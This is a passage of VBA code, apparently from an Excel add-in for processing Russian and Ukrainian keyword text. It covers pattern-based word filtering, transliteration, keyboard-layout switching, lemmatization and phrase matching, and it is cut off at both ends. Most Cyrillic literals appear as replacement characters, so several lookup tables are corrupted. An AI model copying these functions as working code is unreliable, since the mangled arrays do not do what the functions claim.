extrDigits = WStrim(rgxExtract(CStr(r), "[0-9\s]"))
End Function
Private Function containsBold(r As Range) As Boolean
    Dim i As Integer, myTxt As String
containsBold = False
    myTxt = r.Text
    For i = 1 To Len(myTxt)
        With r.Characters(i, 1)
            If .Font.bold = True Then
            containsBold = True
            Exit Function
            End If
        End With
    Next
End Function
Private Function extrBold(r As Range)
    Dim i As Integer, myName As String, myAddress As String, myTxt As String
    Application.Volatile
    myTxt = r.Text
    For i = 1 To Len(myTxt)
        With r.Characters(i, 1)
            If .Font.bold = True Then
                myName = myName & Mid$(myTxt, i, 1)
            ElseIf matchesRE(.Text, "[\s\n\r\t\u00a0\xA0\u1680\u180E\u2000-\u200B\u202F\u205F\u3000\uFEFF]") = True Then
                myName = myName & " "
            Else:
            End If
        End With
    Next
    extrBold = WStrim(myName)
End Function
Private Function toSymbolsPerSpace(x As String) As String
Dim i As Long
For i = 1 To Len(x)
toSymbolsPerSpace = WStrim(toSymbolsPerSpace & " " & Mid$(x, i, 1))
Next i
End Function
Private Function isShorterThan(x As String, y As Long) As Boolean
If Len(x) < y Then isShorterThan = True Else isShorterThan = False
End Function
Private Function isLongerThan(x As String, y As Long) As Boolean
If Len(x) > y Then isLongerThan = True Else isLongerThan = False
End Function
Private Function isBlank(x As String) As Boolean
If Len(x) = 0 Then isBlank = True Else isBlank = False
End Function
Private Function isAlfaNum(x As String) As Boolean
If matchesRE(x, "[a-zA-Z\u0410-\u04FF\u0401\u0451]") Then isAlfaNum = True Else isAlfaNum = False
End Function
Private Function isNonAlfaNum(x As String) As Boolean
If x Like "*[a-zA-Z\u0410-\u04FF\u0401\u0451]*" Then isNonAlfaNum = False Else isNonAlfaNum = True
End Function
Private Function isAllCyr(x As String) As Boolean
If matchesRE(x, "[\u0410-\u04FF\u0401\u0451]") And Not x Like "*[0-9A-Za-z]*" Then isAllCyr = True Else isAllCyr = False
End Function
Private Function isCyrLat(x As String) As Boolean
If matchesRE(x, "[\u0410-\u04FF\u0401\u0451]") And matchesRE(x, "[A-z]") Then isCyrLat = True Else isCyrLat = False
End Function
Private Function isToponym(x As String) As Boolean
On Error Resume Next
If Application.VLookup(UCase(x), abc.Range("Geo_toponyms"), 1, True) = UCase(x) Then isToponym = True Else isToponym = False
If Err > 0 Then isToponym = False
End Function
Private Function isUA(a) As Boolean
Dim ukr()
ukr = Array("|fffd|", "|fffd|", "|fffd|", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", " |fffd||fffd||fffd| ", " |fffd||fffd| ", " |fffd||fffd| ", " |fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", _
 "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd| ", " |fffd||fffd| ", " |fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", _
 "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", " |fffd||fffd||fffd| ", " |fffd||fffd||fffd| ", " |fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ")
x = " " & LCase$(a) & " "
isUA = False
For i = LBound(ukr) To UBound(ukr)
    If InStr(1, " " & x & " ", ukr(i)) > 0 Then
    isUA = True
    Exit For
    End If
Next
End Function
Private Function isN(x) As Boolean
If binSearch(CStr(LCase$(x)), Range("[lemms.xlsb]lemmdict!slovarlyemm"), 3) = "n" Then isN = True Else isN = False
End Function
Private Function isV(x As String) As Boolean
Dim form As String
If endsWith(x, "|fffd||fffd||fffd|") = True Or endsWith(x, "|fffd||fffd||fffd|") = True Then
    isV = True
    Exit Function
Else:
    form = binSearch(CStr(LCase$(x)), Range("[lemms.xlsb]lemmdict!slovarlyemm"), 3)
    If (endsWith(x, "|fffd||fffd|") = True And form <> "n") Or form = "v" Then
            isV = True
        Else:
            isV = False
        End If
End If
End Function
Private Function isA(x) As Boolean
If binSearch(CStr(LCase$(x)), Range("[lemms.xlsb]lemmdict!slovarlyemm"), 3) = "a" Then isA = True Else isA = False
End Function
Private Function isAdvb(x) As Boolean
If binSearch(CStr(LCase$(x)), Range("[lemms.xlsb]lemmdict!slovarlyemm"), 3) = "advb" Then isAdvb = True Else isAdvb = False
End Function
Private Function extrN(x As String) As String
extrN = cVWords("isN", x)
End Function
Private Function extrV(x As String) As String
extrV = cVWords("isV", x)
End Function
Private Function extrA(x As String) As String
extrA = cVWords("isA", x)
End Function
Private Function extrAdvb(x As String) As String
extrAdvb = cVWords("isAdvb", x)
End Function
Private Function findN(x As String) As Boolean
findN = vOnWords("isN", x)
End Function
Private Function findV(x As String) As Boolean
findV = vOnWords("isV", x)
End Function
Private Function findA(x As String) As Boolean
findA = vOnWords("isA", x)
End Function
Private Function findAdvb(x As String) As Boolean
findAdvb = vOnWords("isAdvb", x)
End Function
Private Function remN(x As String) As String
remN = dVWords("isN", x)
End Function
Private Function remV(x As String) As String
remV = dVWords("isV", x)
End Function
Private Function remA(x As String) As String
remA = dVWords("isA", x)
End Function
Private Function remAdvb(x As String) As String
remAdvb = dVWords("isAdvb", x)
End Function
Private Function ExtrWUA(x As String) As String
ExtrWUA = cVWords("ExtrUA", x)
End Function
Private Function extrIfUA(x As String) As String
extrIfUA = extrValid("isUA", x)
End Function
Private Function contLat(s As String) As Boolean
    contLat = s Like "*[A-Za-z]*"
End Function
Private Function nonContLat(s As String) As Boolean
    nonContLat = Not contLat(s)
End Function
Private Function extrWContLat(x As String) As String
extrWContLat = cVWords("contLat", x)
End Function
Private Function delWContLat(x As String) As String
delWContLat = dVWords("contLat", x)
End Function
Private Function capWcontLat(x As String) As String
capWcontLat = capVWords("contlat", x)
End Function
Private Function latinitsaCapsLock(x As String) As String
latinitsaCapsLock = UCaseVWords("contlat", x)
End Function
Private Function clIfContLatin(x As String) As String
clIfContLatin = remValid("contLat", x)
End Function
Private Function extrIfContLat(x As String) As String
extrIfContLat = extrValid("contLat", x)
End Function
Private Function contNum(s As String) As Boolean
    contNum = s Like "*[0-9]*"
End Function
Private Function nonContNum(s As String) As Boolean
    nonContNum = Not contNum(s)
End Function
Private Function delWcontNum(s As String) As String
delWcontNum = dVWords("contNum", s)
End Function
Private Function extrWcontNum(x As String) As String
extrWcontNum = cVWords("contNum", x)
End Function
Private Function clIfContNum(x As String) As String
clIfContNum = remValid("contNum", x)
End Function
Private Function extrIfContNum(x As String) As String
extrIfContNum = extrValid("contNum", x)
End Function

Private Function contUCase(x As String) As Boolean
    contUCase = matchesRE(x, "[A-Z\u0410-\u042F\u0401]")
End Function
Private Function extrWcontUCase(x As String) As String
extrWcontUCase = cVWords("contUCase", x)
End Function
Private Function clIfcontUCase(x As String) As String
clIfcontUCase = remValid("contUCase", x)
End Function
Private Function extrIfContUCase(x As String) As String
extrIfContUCase = extrValid("contUCase", x)
End Function
'-------
Private Function startsWith(x As String, p As String) As Boolean
If UCase(Left(x, Len(p))) = UCase(p) Then startsWith = True Else startsWith = False
End Function
Private Function startsWithAnyFromRng(x As String, rng As Range) As Boolean
startsWithAnyFromRng = vOnAnyFromList("startsWith", x, rng)
End Function
Private Function clIfStartsWithPLst(x As String, rng As Range) As String
clIfStartsWithPLst = remV2PRng("startsWithAnyFromRng", x, rng)
End Function
Private Function extrIfStartsWithPLst(x As String, rng As Range) As String
extrIfStartsWithPLst = extrV2PRng("startsWithAnyFromRng", x, rng)
End Function
Private Function findWordsStartingWith(x As String, p As String)
findWordsStartingWith = cVWords2("startsWith", x, p)
End Function
Private Function findWordsStartingWithAnyFromRng(x As String, rng As Range) As Boolean
findWordsStartingWithAnyFromRng = vOnAnyFromList("findWordsStartingWith", x, rng)
End Function
Private Function extrWordsStartingWith(x As String, p As String)
extrWordsStartingWith = vOnWords2PS("startsWith", x, p)
End Function
Private Function extrWordsStartingWithAnyFromRng(x As String, rng As Range)
extrWordsStartingWithAnyFromRng = extrWVOnAnyFromList("startsWith", x, rng)
End Function
Private Function delWordsStartingWith(x As String, p As String)
delWordsStartingWith = dVWords2("startsWith", x, p)
End Function
Private Function delWordsStartingWithAnyFromRng(x As String, rng As Range)
delWordsStartingWithAnyFromRng = dWVOnAnyFromList("startsWith", x, rng)
End Function
Private Function endsWith(x As String, p As String) As Boolean
If UCase(Right(x, Len(p))) = UCase(p) Then endsWith = True Else endsWith = False
End Function
Private Function endsWithAnyFromRng(x As String, rng As Range) As Boolean
endsWithAnyFromRng = vOnAnyFromList("endsWith", x, rng)
End Function
Private Function findWordsEndingWith(x As String, p As String)
findWordsEndingWith = vOnWords2PS("endsWith", x, p)
End Function
Private Function findWordsEndingWithAnyFromRng(x As String, rng As Range) As Boolean
findWordsEndingWithAnyFromRng = vOnAnyFromList("findWordsEndingWith", x, rng)
End Function
Private Function extrWordsEndingWith(x As String, p As String)
extrWordsEndingWith = cVWords2("endsWith", x, p)
End Function
Private Function extrWordsEndingWithAnyFromRng(x As String, rng As Range)
extrWordsEndingWithAnyFromRng = extrWVOnAnyFromList("endsWith", x, rng)
End Function
Private Function delWordsEndingWith(x As String, p As String)
delWordsEndingWith = dVWords2("endsWith", x, p)
End Function
Private Function delWordsEndingWithAnyFromRng(x As String, rng As Range)
delWordsEndingWithAnyFromRng = dWVOnAnyFromList("endsWith", x, rng)
End Function
Private Function extrIfEndsWithPLst(x As String, rng As Range) As String
extrIfEndsWithPLst = extrV2PRng("endsWithAnyFromRng", x, rng)
End Function
Private Function clIfEndsWithPLst(x As String, rng As Range) As String
clIfEndsWithPLst = remV2PRng("endsWithAnyFromRng", x, rng)
End Function
Private Function isNumW(x As String) As Boolean
If x Like "*[0-9]*" And Not x Like "*[A-Za-z|fffd|-|fffd||fffd|-|fffd|]*" Then isNumW = True Else isNumW = False
End Function
Private Function hasNumW(x As String) As Boolean
hasNumW = vOnWords("isNumW", x)
End Function
Private Function extrNumW(x As String) As String
extrNumW = cVWords("isNumW", x)
End Function
Private Function delNumW(x As String) As String
delNumW = dVWords("isNumW", x)
End Function
Private Function clIfHasNumW(x As String) As String
clIfHasNumW = remValid("hasNumW", x)
End Function
Private Function extrIfHasNum(x As String) As String
extrIfHasNum = extrValid("isNumW", x)
End Function
Private Function extrIfHasNumW(x As String) As String
extrIfHasNumW = extrValid("hasNumW", x)
End Function
Private Function isAllLatin(x As String) As Boolean
If x Like "*[A-Za-z]*" And Not x Like "*[0-9|fffd|-|fffd||fffd|-|fffd|]*" Then isAllLatin = True Else isAllLatin = False
End Function
Private Function hasLatW(x As String) As Boolean
hasLatW = vOnWords("isAllLatin", x)
End Function
Private Function delWordsAllLatin(x As String) As String
delWordsAllLatin = dVWords("isAllLatin", x)
End Function
Private Function extrWordsAllLatin(x As String) As String
extrWordsAllLatin = cVWords("isAllLatin", x)
End Function
Private Function clIfhasLatW(x As String) As String
clIfhasLatW = remValid("hasLatW", x)
End Function
Private Function extrIfhasLatW(x As String) As String
extrIfhasLatW = extrValid("hasLatW", x)
End Function

Private Function extrWordsAllCyr(x As String) As String
extrWordsAllCyr = cVWords("isAllCyr", x)
End Function

Private Function matchesLIKE(x As String, p As String) As Boolean
matchesLIKE = x Like p
End Function
Private Function findWordsByLIKEPattern(x As String, p As String) As String
findWordsByLIKEPattern = vOnWords2PS("matchesLIKE", x, p)
End Function
Private Function delWordsByLIKEPattern(x As String, p As String) As String
delWordsByLIKEPattern = dVWords2("matchesLIKE", x, p)
End Function
Private Function extrWordsByLIKEPattern(x As String, p As String) As String
extrWordsByLIKEPattern = cVWords2("matchesLIKE", x, p)
End Function

Private Function matchesRE(x As String, p As String) As Boolean
Dim objRegEx As Object
Set objRegEx = CreateObject("VBScript.RegExp")
objRegEx.IgnoreCase = False
objRegEx.Global = True
objRegEx.pattern = p
matchesRE = objRegEx.test(x)
End Function
Private Function findWordsByRePattern(x As String, p As String) As String
findWordsByRePattern = vOnWords2PS("matchesRE", x, p)
End Function
Private Function delWordsByRePattern(x As String, p As String) As String
delWordsByRePattern = dVWords2("matchesRE", x, p)
End Function
Private Function extrWordsByRePattern(x As String, p As String) As String
extrWordsByRePattern = cVWords2("matchesRE", x, p)
End Function
Private Function clIfMatchesRE(x As String) As String
clIfMatchesRE = remValid("matchesRE", x)
End Function
Private Function extrIfMatchesRE(x As String) As String
extrIfMatchesRE = extrValid("matchesRE", x)
End Function

Private Function findWByDoublePattern(a, pattern1 As String, pattern2 As String) As Boolean
Dim i As Long
Dim arr() As String
findWByDoublePattern = False
arr = Split(a, " ")
For i = LBound(arr) To UBound(arr)
    If arr(i) Like pattern1 And arr(i) Like pattern2 Then
        findWByDoublePattern = True
        Exit For
    Else:
        End If
Next i
End Function
Private Function extrWByDoublePattern(a, pattern1 As String, pattern2 As String)
Dim i As Long
Dim arr() As String
arr = Split(a, " ")
For i = LBound(arr) To UBound(arr)
    If arr(i) Like pattern1 And arr(i) Like pattern2 Then
    Else:
    arr(i) = ""
    End If
Next i
extrWByDoublePattern = WStrim(Join(arr, " "))
End Function
Private Function ExtrLD(a)
ExtrLD = extrWByDoublePattern(a, "*[A-Za-z]*", "*[0-9]*")
End Function
Private Function ExtrLC(a)
ExtrLC = extrWByDoublePattern(a, "*[A-Za-z]*", "*[|fffd|-|fffd||fffd|-|fffd|]*")
End Function
Private Function ExtrDC(a)
ExtrDC = extrWByDoublePattern(a, "*[0-9]*", "*[|fffd|-|fffd||fffd|-|fffd|]*")
End Function

Private Function extrBeforeFirstNotIncl(x As String, p As String)
If Len(p) > Len(x) Then
extrBeforeFirstNotIncl = ""
ElseIf InStr(1, x, p) > 0 Then
extrBeforeFirstNotIncl = Left(x, InStr(1, x, p) - 1)
Else
extrBeforeFirstNotIncl = ""
End If
End Function
Private Function extrBeforeFirstIncl(x As String, p As String)
If Len(p) > Len(x) Then
extrBeforeFirstIncl = ""
ElseIf InStr(1, x, p) > 0 Then
extrBeforeFirstIncl = Left(x, InStr(1, x, p) + Len(p) - 1)
Else
extrBeforeFirstIncl = ""
End If
End Function
Private Function extrAfterLastIncl(x As String, p As String)
If Len(p) > Len(x) Then
extrAfterLastIncl = ""
ElseIf InStrRev(x, p) > 0 Then
extrAfterLastIncl = Right(x, Len(x) - InStrRev(x, p) + 1)
Else: extrAfterLastIncl = ""
End If
End Function
Private Function extrAfterLastNotIncl(x As String, p As String)
If Len(p) > Len(x) Then
extrAfterLastNotIncl = ""
ElseIf InStrRev(x, p) > 0 Then
extrAfterLastNotIncl = Right(x, Len(x) - InStrRev(x, p) - Len(p) + 1)
Else
extrAfterLastNotIncl = ""
End If
End Function
Function extrFirstWord(x As String) As String
extrFirstWord = Left(x, InStr(1, x & " ", " ") - 1)
End Function
Private Function extrFirstNWords(x As String, n As Long)
Dim arr() As String, i As Long
arr() = Split(x)
If n > UBound(arr) + 1 Then
    extrFirstNWords = x
Else:
For i = LBound(arr) To n - 1
    extrFirstNWords = extrFirstNWords & " " & arr(i)
Next i
End If
extrFirstNWords = Trim(extrFirstNWords)
End Function
Private Function extrLastNWords(x As String, n As Long)
Dim arr() As String, i As Long
arr() = Split(x)
If n > UBound(arr) + 1 Then
    extrLastNWords = x
Else:
For i = UBound(arr) - n + 1 To UBound(arr)
    extrLastNWords = extrLastNWords & " " & arr(i)
Next i
End If
extrLastNWords = Trim(extrLastNWords)
End Function
Private Function extrFirstNSym(x As String, n As Long)
extrFirstNSym = Left(x, n)
End Function
Private Function extrLastNSym(x As String, n As Long)
extrLastNSym = Right(x, n)
End Function

Private Function sBolshoy(x As String) As String
sBolshoy = StrConv(x, vbProperCase)
End Function
Private Function vsyesbolshoy(txt)
Dim i As Long
Dim arr() As String
arr = Split(txt, " ")
For i = LBound(arr) To UBound(arr)
    arr(i) = StrConv(arr(i), vbProperCase)
Next i
vsyesbolshoy = Join(arr, " ")
End Function
Private Function vsyekapslokom(x As String) As String
vsyekapslokom = UCase$(x)
End Function

Private Function flipwords(x As String, Optional delimeter As String = " ")
Dim arr() As String, temparr() As String, i As Long
arr = Split(x, delimeter)
temparr = Split(x, delimeter)
For i = LBound(arr) To UBound(arr)
    temparr(UBound(arr) - i) = arr(i)
Next i
flipwords = Join(temparr, delimeter)
End Function
Private Function byezUTMmyetok(x As String)
x = rgxReplace(x, "(\?|&)utm_[^$#&]+", "")
If InStr(1, x, "?") = 0 And InStr(1, x, "&") > 0 Then byezUTMmyetok = replFirstOcc(x, "&", "?") Else byezUTMmyetok = x
End Function
Private Function sortInCellAZ(x As String)
Dim i As Long, arr As Variant
If Len(x) = 0 Or InStr(1, x, " ") = 0 Then
    sortInCellAZ = x
    Exit Function
Else:
    arr = Split(x)
    QuickSort arr, LBound(arr), UBound(arr)
    sortInCellAZ = WStrim(Join(arr, " "))
End If
End Function
Function JoinCells(r As Range, Optional x As String = "")
Dim arr(), arrtemp()
Dim i As Long
arrtemp = r.Value2
If UBound(arrtemp) = 1 Then
arr = Application.WorksheetFunction.Transpose(r.Value2)
Else:
arr = r.Value2
End If
JoinCells = CStr(arr(1, 1))
For i = LBound(arr) + 1 To UBound(arr)
JoinCells = JoinCells & x & arr(i, 1)
Next i
End Function
Private Function removeAfterIncluding(x As String, s As String) As String
removeAfterIncluding = Left(x, InStr(1, x & s, s) - 1)
End Function
Private Function byezkavychyek(s As String) As String
byezkavychyek = Replace(s, """", "")
End Function
Private Function byezkvadrskobok(s As String) As String
byezkvadrskobok = Replace(Replace(s, "[", ""), "]", "")
End Function
Private Function Translit(x As String) As String
Dim i As Long
    cyr = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    lat = Array("a", "b", "v", "g", "d", "e", "e", "zh", "z", "i", "y", "k", _
        "l", "m", "n", "o", "p", "r", "s", "t", "u", "f", "kh", "ts", "ch", _
        "sh", "sch", "y", "y", "", "e", "yu", "ya")
    For i = 1 To 33
        x = Replace(x, Mid(cyr, i, 1), lat(i), , , vbBinaryCompare)
        x = Replace(x, UCase(Mid(cyr, i, 1)), StrConv(lat(i), vbProperCase), , , vbBinaryCompare)
    Next
    Translit = x
End Function
Private Function PuntoSwitch(txt As String) As String
    arr1 = "f,dult`;pbqrkvyjghcnea[wxio]sm'.z"
    arr2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    For iCount% = 1 To 33
        txt = Replace(txt, Mid$(arr1, iCount%, 1), Mid$(arr2, iCount%, 1), , , vbBinaryCompare)      ' strochnyye
        txt = Replace(txt, UCase$(Mid$(arr1, iCount%, 1)), UCase$(Mid$(arr2, iCount%, 1)), , , vbBinaryCompare)     ' propisnyye
    Next
    PuntoSwitch = txt
End Function
Private Function UnTranslit(ByVal x As String) As String
    Dim cyr()
    Dim lat()
    Dim i As Long
    lat = Array("Sch", "sch", "''", "Kh", "kh", "Ch", "ch", "yu", "ya", "yo", "iy", "oy", "ey", "Ya", "Zh", "zh", "Yo", _
            "Yu", "Sh", "sh", "Y", "y", "Zh", "zh", "'e", "'", "A", "a", "B", "b", "C", "c", "D", "d", "E", "e", _
            "F", "f", "G", "g", "H", "h", "I", "i", "K", "k", "L", "l", "M", "m", _
            "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "s", "T", "t", "U", "u", "V", "v", "Z", "z")
    cyr = Array("|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
    For i = LBound(lat) To UBound(lat)
        If InStr(1, x, lat(i)) > 0 Then x = Replace(x, lat(i), cyr(i), , , vbBinaryCompare)
    Next i
    UnTranslit = x
End Function
Private Function Transcribe(ByVal x As String) As String
    Dim cyr()
    Dim lat()
    Dim i As Long
    lat = Array("Sch", "sch", "Co", "Ca", "co", "ca", "Kh", "kh", "Ch", "ch", "yu", "ya", "yo", "iy", "oy", "ey", "Ya", "Zh", "zh", "Yo", _
            "Yu", "Sh", "sh", "Y", "y", "Zh", "zh", "'e", "'", "A", "a", "B", "b", "C", "c", "D", "d", "E", "e", _
            "F", "f", "G", "g", "H", "h", "I", "i", "K", "k", "L", "l", "M", "m", _
            "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "s", "T", "t", "U", "u", "V", "v", "Z", "z")
    cyr = Array("|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
            "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
    For i = LBound(lat) To UBound(lat)
        If InStr(1, x, lat(i)) > 0 Then x = Replace(x, lat(i), cyr(i), , , vbBinaryCompare)
    Next i
    Transcribe = x
End Function
Private Function ReplCommonLettersRuEn(ByVal x As String) As String
    Dim cyr()
    Dim lat()
    Dim i As Long
    lat = Array("|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
    cyr = Array("a", "A", "B", "e", "E", "H", "k", "K", "M", "o", "p", "P", "c", "C", "T", "y", "x", "X")
    For i = LBound(lat) To UBound(lat)
        If InStr(1, x, lat(i)) > 0 Then x = Replace(x, lat(i), cyr(i), , , vbBinaryCompare)
    Next i
    ReplCommonLettersRuEn = x
End Function
Private Function ReplCommonLettersEnRu(ByVal x As String) As String
    Dim cyr()
    Dim lat()
    Dim i As Long
    cyr = Array("|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|")
    lat = Array("a", "A", "B", "e", "E", "H", "k", "K", "M", "o", "p", "P", "c", "C", "T", "y", "x", "X")
    For i = LBound(lat) To UBound(lat)
        If InStr(1, x, lat(i)) > 0 Then x = Replace(x, lat(i), cyr(i), , , vbBinaryCompare)
    Next i
    ReplCommonLettersEnRu = x
End Function
Private Function ruToUTF8(ByVal txt As String) As String
    txtRussian$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arrUTF8 = Array("", "%d0%b0", "%d0%b1", "%d0%b2", "%d0%b3", "%d0%b4", "%d0%b5", "%d1%91", "%d0%b6", "%d0%b7", "%d0%b8", _
    "%d0%b9", "%d0%ba", "%d0%bb", "%d0%bc", "%d0%bd", "%d0%be", "%d0%bf", "%d1%80", "%d1%81", "%d1%82", "%d1%83", _
    "%d1%84", "%d1%85", "%d1%86", "%d1%87", "%d1%88", "%d1%89", "%d1%8a", "%d1%8b", "%d1%8c", "%d1%8d", "%d1%8e", "%d1%8f")
    For iCount% = 1 To 33
        txt$ = Replace(LCase$(txt$), Mid$(txtRussian$, iCount%, 1), arrUTF8(iCount%), , , vbBinaryCompare)
    Next
    ruToUTF8$ = txt$
End Function
Private Function lemmatstr(a As String)
On Error Resume Next
Err.Clear
If Application.VLookup(a, Range("[lemms.xlsb]lemmdict!slovarlyemm").Columns(1), 1, True) = a Then
    lemmatstr = Application.VLookup(a, Range("[lemms.xlsb]lemmdict!slovarlyemm"), 2, True)
Else
    lemmatstr = Left(a, Len(a) - Len(Right(a, 4))) & binSearch(Right(a, 4), abc.Range("lemmSuf"), 2)
End If
If Err <> 0 Then lemmatstr = a
End Function
Function Lemmatize(a As String) As String
Dim arr() As String, strg As String
arr() = Split(a)
For i = LBound(arr) To UBound(arr)
  strg = strg & lemmatstr(arr(i)) & " "
Next i
Lemmatize = WStrim(strg)
End Function
Private Function remLastNWords(x As String, n As Long) As String
remLastNWords = extrFirstNWords(x, slov(x) - n)
End Function
Private Function remFirstNWords(x As String, n As Long) As String
remFirstNWords = extrLastNWords(x, slov(x) - n)
End Function
Private Function norm(x As String)
norm = Lemmatize(remRepWords(sortInCellAZ(LCase$(x))))
End Function
Private Function remLastNSym(x As String, n As Long) As String
If n > Len(x) Then remLastNSym = "" Else remLastNSym = Left$(x, Len(x) - n)
End Function
Private Function remFirstNSym(x As String, n As Long) As String
If n > Len(x) Then remFirstNSym = "" Else remFirstNSym = Mid$(x, n + 1, Len(x) - n)
End Function
Private Function remFirstAndLastSym(x As String) As String
remFirstAndLastSym = Mid$(x, 2, Len(x) - 2)
End Function
Private Function remBeforeFirstIncl(x As String, sym As String)
remBeforeFirstIncl = Right(x, Len(x) - InStr(1, x, sym))
End Function
Private Function remBeforeFirst(x As String, sym As String)
remBeforeFirst = Right(x, Len(x) - InStr(1, x, sym) + 1)
End Function
Private Function LevensteinClosestInRng(txt As String, rng As Range) As String
Dim temp As Long
temp = 1000
    For Each cell In rng
        If Levenstein(cell.Value, txt) < temp Then
            LevensteinClosestInRng = cell.Value
            temp = Levenstein(cell.Value, txt)
        End If
    Next cell
End Function
Private Function isChild(x As String, child As String) As Boolean
Dim i As Long, arr() As String
arr = Split(x, " ")
isChild = False
If x = child Then Exit Function
isChild = True
child = " " & child & " "
For i = LBound(arr) To UBound(arr)
    If InStr(1, child, " " & arr(i) & " ") > 0 Then
    Else: isChild = False
    Exit For
    End If
Next
End Function
Private Function firstChild(x As String, rng As Range) As String
Dim arr(), i As Long
arr = rng.Value2
firstChild = ""
    For i = LBound(arr) To UBound(arr)
        If isChild(x, CStr(arr(i, 1))) Then
        firstChild = CStr(arr(i, 1))
        Exit For
        End If
    Next i
End Function
Private Function firstParent(x As String, rng As Range) As String
Dim arr(), i As Long
arr = rng.Value2
firstParent = ""
    For i = LBound(arr) To UBound(arr)
        If isChild(CStr(arr(i, 1)), x) Then
        firstParent = CStr(arr(i, 1))
        Exit For
        End If
    Next i
End Function
Private Function closestChildren(txt As String, rng As Range) As String
Dim temp As Long, arr(), i As Long
temp = 3
arr = rng.Value2
closestChildren = ""
    For i = LBound(arr) To UBound(arr)
        If isChild(CStr(arr(i, 1)), txt) And WordDiff(CStr(arr(i, 1)), txt) < temp Then
            closestChildren = CStr(arr(i, 1))
            temp = WordDiff(CStr(arr(i, 1)), txt)
        ElseIf isChild(CStr(arr(i, 1)), txt) And WordDiff(CStr(arr(i, 1)), txt) = temp Then
            closestChildren = closestChildren & ", " & CStr(arr(i, 1))
        End If
    Next i
End Function
Private Function closestParents(txt As String, rng As Range) As String
Dim temp As Long, arr(), i As Long
temp = 3
arr = rng.Value2
closestParents = ""
    For i = LBound(arr) To UBound(arr)
        If isChild(txt, CStr(arr(i, 1))) And WordDiff(CStr(arr(i, 1)), txt) < temp And WordDiff(CStr(arr(i, 1)), txt) > 0 Then
            closestParents = CStr(arr(i, 1))
            temp = WordDiff(CStr(arr(i, 1)), txt)
        ElseIf isChild(txt, CStr(arr(i, 1))) And WordDiff(CStr(arr(i, 1)), txt) = temp Then
            closestParents = closestParents & ", " & CStr(arr(i, 1))
        End If
    Next i
End Function
Private Function listContainsParents(txt As String, rng As Range) As Boolean
Dim arr(), i As Long
arr = rng.Value2
listContainsParents = False
    For i = LBound(arr) To UBound(arr)
        If isChild(txt, CStr(arr(i, 1))) Then
            listContainsParents = True
            Exit Function
        End If
    Next i
End Function
Private Function firstClosestBroadParent(txt As String, rng As Range) As String
Dim temp As Long, i As Long, arr(), lemma As String, tmpstr As String
lemma = Lemmatize(byezstopslov(txt))
temp = 10
firstClosestBroadParent = ""
arr = rng.Value2
